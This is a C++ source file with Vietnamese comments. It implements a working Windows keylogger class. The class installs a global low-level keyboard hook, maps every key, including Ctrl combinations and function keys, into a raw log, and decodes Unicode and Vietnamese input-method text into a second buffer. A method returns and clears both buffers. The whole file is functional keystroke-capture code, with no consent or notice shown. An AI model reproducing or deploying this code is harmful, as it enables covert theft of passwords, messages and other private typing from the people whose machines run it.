#include "Keylogger.h"
#include <iostream>
#include <sstream>

Keylogger* g_KeyloggerInstance = nullptr;

Keylogger::Keylogger()
    : _isRunning(false), _hook(NULL), _threadId(0),
    _detectedMode("Auto-Detect"),
    _inputMethodStatus("Waiting..."),
    _lastPhysicalKey(0) {
    g_KeyloggerInstance = this;
}

Keylogger::~Keylogger() {
    StopKeyLogging();
    g_KeyloggerInstance = nullptr;
}

LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
        if (g_KeyloggerInstance) {
            g_KeyloggerInstance->ProcessKey(pKey->vkCode, pKey->scanCode, pKey->flags);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void PopLastUtf8Char(std::string& str) {
    if (str.empty()) return;
    if ((str.back() & 0x80) == 0) { str.pop_back(); return; }
    while (!str.empty() && (str.back() & 0xC0) == 0x80) { str.pop_back(); }
    if (!str.empty()) str.pop_back();
}

// --- HÀM MAP PHÍM ULTRA FULL (KHÔNG BỎ SÓT PHÍM NÀO) ---
std::string Keylogger::MapVkToRawString(DWORD vkCode, bool isShift, bool isCaps) {
    bool isUpper = isShift ^ isCaps;

    // 1. CHỮ CÁI A-Z
    if (vkCode >= 'A' && vkCode <= 'Z') {
        char c = (char)vkCode;
        if (!isUpper) c += 32;
        bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
        if (isCtrl) return "[CTRL+" + std::string(1, (char)vkCode) + "]";
        return std::string(1, c);
    }

    // 2. SỐ 0-9
    if (vkCode >= '0' && vkCode <= '9') {
        if (isShift) { const char s[] = ")!@#$%^&*("; return std::string(1, s[vkCode - '0']); }
        return std::string(1, (char)vkCode);
    }

    // 3. F1 - F24
    if (vkCode >= VK_F1 && vkCode <= VK_F24) return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";

    // 4. FULL DANH SÁCH PHÍM CHỨC NĂNG (THEO CHUẨN MICROSOFT)
    switch (vkCode) {
        // --- Chuột (Hiếm gặp nhưng cứ thêm) ---
    case VK_LBUTTON:  return "[MOUSE_L]";
    case VK_RBUTTON:  return "[MOUSE_R]";
    case VK_CANCEL:   return "[BREAK]";
    case VK_MBUTTON:  return "[MOUSE_M]";
    case VK_XBUTTON1: return "[MOUSE_X1]";
    case VK_XBUTTON2: return "[MOUSE_X2]";

        // --- Cơ bản ---
    case VK_BACK:     return "[BACK]";
    case VK_TAB:      return "[TAB]";
    case VK_CLEAR:    return "[CLEAR]";
    case VK_RETURN:   return "\n";
    case VK_SPACE:    return " ";
    case VK_ESCAPE:   return "[ESC]";
    case VK_CAPITAL:  return "[CAPS]";
    case VK_LSHIFT:   return "[LSHIFT]";
    case VK_RSHIFT:   return "[RSHIFT]";
    case VK_LCONTROL: return "[LCTRL]";
    case VK_RCONTROL: return "[RCTRL]";
    case VK_LMENU:    return "[LALT]";
    case VK_RMENU:    return "[RALT]";
    case VK_LWIN:     return "[LWIN]";
    case VK_RWIN:     return "[RWIN]";
    case VK_APPS:     return "[MENU]";
    case VK_SLEEP:    return "[SLEEP]"; // Phím ngủ

        // --- Điều hướng & Soạn thảo ---
    case VK_PRIOR:    return "[PAGEUP]";
    case VK_NEXT:     return "[PAGEDOWN]";
    case VK_END:      return "[END]";
    case VK_HOME:     return "[HOME]";
    case VK_LEFT:     return "[LEFT]";
    case VK_UP:       return "[UP]";
    case VK_RIGHT:    return "[RIGHT]";
    case VK_DOWN:     return "[DOWN]";
    case VK_SELECT:   return "[SELECT]";
    case VK_PRINT:    return "[PRINT]";
    case VK_EXECUTE:  return "[EXECUTE]";
    case VK_SNAPSHOT: return "[PRINTSCR]";
    case VK_INSERT:   return "[INS]";
    case VK_DELETE:   return "[DEL]";
    case VK_HELP:     return "[HELP]";
    case VK_SCROLL:   return "[SCROLLLOCK]";
    case VK_PAUSE:    return "[PAUSE]";

        // --- NUMPAD (Bàn phím số) ---
    case VK_NUMPAD0:  return "0";
    case VK_NUMPAD1:  return "1";
    case VK_NUMPAD2:  return "2";
    case VK_NUMPAD3:  return "3";
    case VK_NUMPAD4:  return "4";
    case VK_NUMPAD5:  return "5";
    case VK_NUMPAD6:  return "6";
    case VK_NUMPAD7:  return "7";
    case VK_NUMPAD8:  return "8";
    case VK_NUMPAD9:  return "9";
    case VK_MULTIPLY: return "*";
    case VK_ADD:      return "+";
    case VK_SEPARATOR:return "|";
    case VK_SUBTRACT: return "-";
    case VK_DECIMAL:  return ".";
    case VK_DIVIDE:   return "/";
    case VK_NUMLOCK:  return "[NUMLOCK]";

        // --- MULTIMEDIA (Fix lỗi 0xAD, 0xB3...) ---
    case VK_VOLUME_MUTE:     return "[MUTE]";
    case VK_VOLUME_DOWN:     return "[VOL-]";
    case VK_VOLUME_UP:       return "[VOL+]";
    case VK_MEDIA_NEXT_TRACK:return "[NEXT]";
    case VK_MEDIA_PREV_TRACK:return "[PREV]";
    case VK_MEDIA_STOP:      return "[STOP]";
    case VK_MEDIA_PLAY_PAUSE:return "[PLAY/PAUSE]";

        // --- BROWSER ---
    case VK_BROWSER_BACK:    return "[WEB_BACK]";
    case VK_BROWSER_FORWARD: return "[WEB_FWD]";
    case VK_BROWSER_REFRESH: return "[REFRESH]";
    case VK_BROWSER_STOP:    return "[WEB_STOP]";
    case VK_BROWSER_SEARCH:  return "[SEARCH]";
    case VK_BROWSER_FAVORITES:return "[FAV]";
    case VK_BROWSER_HOME:    return "[WEB_HOME]";

        // --- LAUNCHER ---
    case VK_LAUNCH_MAIL:     return "[MAIL]";
    case VK_LAUNCH_MEDIA_SELECT: return "[MEDIA]";
    case VK_LAUNCH_APP1:     return "[APP1]";
    case VK_LAUNCH_APP2:     return "[APP2]";

        // --- DẤU CÂU (OEM) ---
    case VK_OEM_1:      return isShift ? ":" : ";";
    case VK_OEM_PLUS:   return isShift ? "+" : "=";
    case VK_OEM_COMMA:  return isShift ? "<" : ",";
    case VK_OEM_MINUS:  return isShift ? "_" : "-";
    case VK_OEM_PERIOD: return isShift ? ">" : ".";
    case VK_OEM_2:      return isShift ? "?" : "/";
    case VK_OEM_3:      return isShift ? "~" : "`";
    case VK_OEM_4:      return isShift ? "{" : "[";
    case VK_OEM_5:      return isShift ? "|" : "\\";
    case VK_OEM_6:      return isShift ? "}" : "]";
    case VK_OEM_7:      return isShift ? "\"" : "'";
    case VK_OEM_8:      return "[OEM8]"; // Phím lạ tùy bàn phím
    case VK_OEM_102:    return isShift ? ">" : "<"; // Phím <> cạnh Shift trái (ISO)
    case VK_OEM_CLEAR:  return "[CLEAR]";

        // --- IME (Bộ gõ Nhật/Hàn/Trung - Có thể xuất hiện nếu máy cài ngôn ngữ này) ---
    case VK_KANA:     return "[IME_KANA]";
    case VK_JUNJA:    return "[IME_JUNJA]";
    case VK_FINAL:    return "[IME_FINAL]";
    case VK_HANJA:    return "[IME_HANJA]";
    case VK_CONVERT:  return "[IME_CONVERT]";
    case VK_NONCONVERT: return "[IME_NONCONVERT]";
    case VK_ACCEPT:   return "[IME_ACCEPT]";
    case VK_MODECHANGE: return "[IME_MODECHANGE]";
    case VK_PROCESSKEY: return "[PROCESS]"; // Phím đang được IME xử lý

        // --- CÁC PHÍM LẠ KHÁC ---
    case VK_PACKET:     return ""; // Bỏ qua phím Unicode ảo
    case VK_ATTN:       return "[ATTN]";
    case VK_CRSEL:      return "[CRSEL]";
    case VK_EXSEL:      return "[EXSEL]";
    case VK_EREOF:      return "[EREOF]";
    case VK_PLAY:       return "[PLAY]";
    case VK_ZOOM:       return "[ZOOM]";
    case VK_PA1:        return "[PA1]";

        // --- 0xFF (Fix lỗi 0xFF) ---
        // Đây thường là phím Fn hoặc phím rác do phần cứng gửi liên tục
    case 0xFF: return ""; // Bỏ qua, không in ra cho đỡ rối
    }

    // Nếu vẫn không có trong danh sách trên thì in Hex để debug
    char buff[64];
    sprintf_s(buff, "[0x%X]", vkCode);
    return std::string(buff);
}

// --- SỬA LOGIC NHẬN DIỆN MODE ---
void Keylogger::AnalyzeInputMethod(DWORD vkCode, bool isInjected) {
    HKL currentLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));

    // 1. Kiểm tra bộ gõ Windows mặc định (WinIME)
    if ((reinterpret_cast<UINT_PTR>(currentLayout) & 0xFFFF) == 0x042a) {
        _inputMethodStatus = "VIETNAMESE (WinIME)";
        _detectedMode = "Microsoft Telex"; // Windows 10/11 tích hợp sẵn
        return;
    }

    // 2. Kiểm tra Unikey (Dựa vào cờ isInjected - Phím giả)
    if (isInjected) {
        _inputMethodStatus = "VIETNAMESE (Unikey)";

        // Logic đoán Telex/VNI dựa vào phím xóa (Backspace) giả
        if (vkCode == VK_BACK) {
            if (strchr("SFRXJAOWD", (char)_lastPhysicalKey)) _detectedMode = "TELEX";
            else if (_lastPhysicalKey >= '0' && _lastPhysicalKey <= '9') _detectedMode = "VNI";
        }
    }
    // 3. Nếu là phím thật (Không phải do phần mềm bơm vào) -> Tiếng Anh
    else {
        // Chỉ xét các phím ký tự thông thường
        if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
            // Nếu trước đó không phải Unikey thì chốt là Tiếng Anh
            if (_inputMethodStatus.find("Unikey") == std::string::npos) {
                _inputMethodStatus = "ENGLISH (Confirmed)";
                _detectedMode = "---"; // <--- THÊM DÒNG NÀY ĐỂ RESET MODE
            }
        }
        _lastPhysicalKey = vkCode;
    }
}
void Keylogger::ProcessKey(DWORD vkCode, DWORD scanCode, DWORD flags) {
    std::lock_guard<std::mutex> lock(_mutex);
    bool isInjected = (flags & LLKHF_INJECTED) != 0;

    AnalyzeInputMethod(vkCode, isInjected);

    // 1. RAW BUFFER
    if (!isInjected) {
        bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
        bool isCaps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        _rawLogBuffer += MapVkToRawString(vkCode, isShift, isCaps);
    }

    // 2. TEXT BUFFER
    if (vkCode == VK_BACK) {
        PopLastUtf8Char(_finalLogBuffer);
        return;
    }

    // TAB đổi thành dấu cách cho gọn
    if (vkCode == VK_TAB) {
        _finalLogBuffer += " ";
        return;
    }

    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    if (GetKeyState(VK_SHIFT) & 0x8000) keyboardState[VK_SHIFT] = 0x80;
    if (GetKeyState(VK_CAPITAL) & 0x0001) keyboardState[VK_CAPITAL] = 0x01;

    WCHAR buffer[16] = { 0 };
    if (vkCode == VK_PACKET) { buffer[0] = (WCHAR)scanCode; }
    else { ToUnicode(vkCode, scanCode, keyboardState, buffer, 16, 0); }

    char utf8Buffer[16] = { 0 };
    if (WideCharToMultiByte(CP_UTF8, 0, buffer, 1, utf8Buffer, 16, NULL, NULL) > 0) {
        bool isCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
        // Chỉ ghi ký tự nếu không phải Ctrl (trừ Enter)
        if (!isCtrl || vkCode == VK_RETURN) _finalLogBuffer += utf8Buffer;
    }
}

void Keylogger::RunHookLoop() {
    _threadId = GetCurrentThreadId();
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!_hook) return;
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_QUIT) break;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(_hook);
    _hook = NULL; _threadId = 0;
}

void Keylogger::StartKeyLogging() {
    if (_isRunning) return;
    _isRunning = true;
    _rawLogBuffer = ""; _finalLogBuffer = "";
    _loggerThread = std::thread(&Keylogger::RunHookLoop, this);
}

void Keylogger::StopKeyLogging() {
    if (!_isRunning) return;
    _isRunning = false;
    if (_threadId != 0) PostThreadMessage(_threadId, WM_QUIT, 0, 0);
    if (_loggerThread.joinable()) _loggerThread.join();
}

std::string Keylogger::GetLoggedKeys() {
    std::lock_guard<std::mutex> lock(_mutex);
    std::stringstream ss;
    ss << "MODE: " << _detectedMode << "\n";
    ss << "STATUS: " << _inputMethodStatus << "\n";
    ss << "---RAW---\n" << _rawLogBuffer << "\n";
    ss << "---TEXT---\n" << _finalLogBuffer;
    _rawLogBuffer.clear(); _finalLogBuffer.clear();
    return ss.str();
}